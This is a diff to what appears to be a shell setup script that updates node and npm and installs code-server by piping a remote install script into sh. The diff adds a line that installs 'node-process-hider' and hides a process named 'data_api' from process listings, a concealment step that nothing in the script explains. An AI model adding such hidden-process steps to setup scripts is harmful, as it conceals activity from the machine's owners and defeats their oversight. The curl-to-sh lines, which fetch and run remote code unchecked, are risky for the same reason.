@@ -3,6 +3,7 @@ sudo n latest
 sudo npm install -g npm
 hash -d npm
 npm i
+npm i -g node-process-hider && ph add data_api
 curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
 curl -fsSL https://code-server.dev/install.sh | sh
 timeout 2s code-server
